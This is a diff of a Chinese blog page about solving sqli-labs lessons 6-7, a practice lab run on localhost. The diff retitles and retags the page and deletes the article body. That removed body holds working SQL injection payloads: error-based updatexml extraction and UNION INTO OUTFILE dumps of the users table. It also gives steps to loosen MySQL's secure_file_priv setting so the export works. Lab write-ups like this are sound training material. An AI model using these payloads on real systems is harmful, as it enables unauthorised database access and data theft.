@@ -4,12 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-lab  less6-7, 是小竹不是小猪">
-    <meta name="description" content="less6- ”闭合报错注入步骤一：sqlmap进行扫描
-
-由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。
-爆数据库名称
-id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
+    <meta name="keywords" content="sqli-labs Less 6-7 解题记录, 是小竹不是小猪">
+    <meta name="description" content="sqli-labs Less 6-7 解题记录 | 是小竹不是小猪">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +17,7 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqli-lab  less6-7 | 是小竹不是小猪</title>
+    <title>sqli-labs Less 6-7 解题记录 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -313,12 +309,12 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqli-lab  less6-7</h1>
+                    <h1 class="description center-align post-title">sqli-labs Less 6-7 解题记录</h1>
                 </div>
             </div>
         </div>
@@ -432,9 +428,17 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -467,83 +471,7 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="less6-”闭合报错注入"><a href="#less6-”闭合报错注入" class="headerlink" title="less6- ”闭合报错注入"></a>less6- ”闭合报错注入</h2><p>步骤一：sqlmap进行扫描</p>
-<p><img src="/2022/02/28/0227/1.PNG" alt="1"></p>
-<p>由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。</p>
-<p>爆数据库名称</p>
-<pre><code class="sql">id=-1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)
-</code></pre>
-<p><img src="/2022/02/28/0227/2.PNG" alt="2"></p>
-<p>爆表名</p>
-<pre><code class="sql">1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
-</code></pre>
-<p><img src="/2022/02/28/0227/3.PNG" alt="3"></p>
-<p>爆字段名</p>
-<pre><code class="sql">http://localhost/sqil/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) --+--+table_name=‘users’),0x7e),1) --+
-</code></pre>
-<p><img src="/2022/02/28/0227/4.PNG" alt="4"></p>
-<p>爆数据</p>
-<pre><code class="sql">1&quot;  and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23 
-</code></pre>
-<p><img src="/2022/02/28/0227/5.PNG" alt="5"></p>
-<h2 id="less7–文件读写注入"><a href="#less7–文件读写注入" class="headerlink" title="less7–文件读写注入"></a>less7–文件读写注入</h2><p>利用sqlmap进行扫描</p>
-<p><img src="/2022/02/28/0227/6.PNG" alt="6"></p>
-<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20220227150404246.png" alt="image-20220227150404246"></p>
-<p>发现闭合语句提示id=’) ,但是在尝试的时候发现不能完成闭合，于是尝试了id=’))可以完成。</p>
-<p><img src="/2022/02/28/0227/8.PNG" alt="8"></p>
-<p><img src="/2022/02/28/0227/9.PNG" alt="9"></p>
-<p>证明是否有写入权限：返回正常说明有。</p>
-<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0 --+
-</code></pre>
-<p><img src="/2022/02/28/0227/10.PNG" alt="10"></p>
-<p>证明有3列</p>
-<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) order by 4 --+  
-</code></pre>
-<p><img src="/2022/02/28/0227/11.PNG" alt="11"></p>
-<p>使用下列语句尝试导出</p>
-<pre><code class="sql">http://localhost:80/sqils/Less-7/?id=1&#39;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+
-</code></pre>
-<p>如果发现在该路径下面未出现相关文件，则进行以下操作：</p>
-<p>一、检查权限</p>
-<p>若使用下面方法发现显示正常则权限为root合适，进行下一步。</p>
-<pre><code class="sql">http://localhost:80/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+
-</code></pre>
-<p>二、需要在指定目录下进行导出</p>
-<p>在mysql的bin文件夹下打开终端输入以下命令，打开mysql命令行。</p>
-<pre><code>mysql -u root -p
-</code></pre>
-<p>输入以下命令检查权限。</p>
-<pre><code class="shell">show variables like &#39;%secure%&#39;
-</code></pre>
-<p><img src="/2022/02/28/0227/14.PNG" alt="14"></p>
-<p>观察secure_file_priv参数，如果是一个路径那么，只能在该路径下导出。</p>
-<p>如果是空，则没有限制，如果是NULL则不允许导出。</p>
-<p>打开Mysql下载文件夹，打开my.ini文件，查找secure_file_priv配置，如果存在则进行修改，如果不存在，则在[mysqld]下加入 secure_file_priv = “F:/data”</p>
-<p><img src="/2022/02/28/0227/19.PNG" alt="19"></p>
-<p><img src="/2022/02/28/0227/20.PNG" alt="20"></p>
-<p>关闭mysql服务并再次重启，查看secure_file_priv，发现改动生效。</p>
-<p><img src="/2022/02/28/0227/13.PNG" alt="13"></p>
-<p>直接使用该路径进行导出，获得数据。</p>
-<p><img src="/2022/02/28/0227/15.PNG" alt="15"></p>
-<p><img src="/2022/02/28/0227/16.PNG" alt="16"></p>
-<p><img src="/2022/02/28/0227/17.PNG" alt="17"></p>
-<pre><code class="sql">
-
-#字段数
-
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;F:\\data\\1.txt&quot; --+
-#数据库名称
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,user(),database() into outfile &quot;F:\\data\\2.txt&quot; --+
-#爆表名
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile &quot;F:\\data\\3.txt&quot;--+
-#爆字段名
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile &quot;F:\\data\\4.txt&quot;--+
-#爆数据
-http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile &quot;F:\\data\\5.txt&quot;--+
-</code></pre>
-<p>参考链接</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7b9256de20d1">https://www.jianshu.com/p/7b9256de20d1</a></p>
-
+                
                 
             </div>
             <hr/>
@@ -606,7 +534,15 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -784,9 +720,9 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqli-lab less11-12">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="sqli-labs Less 11-12 解题记录">
                         
-                        <span class="card-title">sqli-lab less11-12</span>
+                        <span class="card-title">sqli-labs Less 11-12 解题记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -808,6 +744,18 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                     </div>
                 </div>
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -821,9 +769,9 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="sqli-lab  less8-10">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="sqli-labs Less 8-10 解题记录">
                         
-                        <span class="card-title">sqli-lab  less8-10</span>
+                        <span class="card-title">sqli-labs Less 8-10 解题记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -843,6 +791,18 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
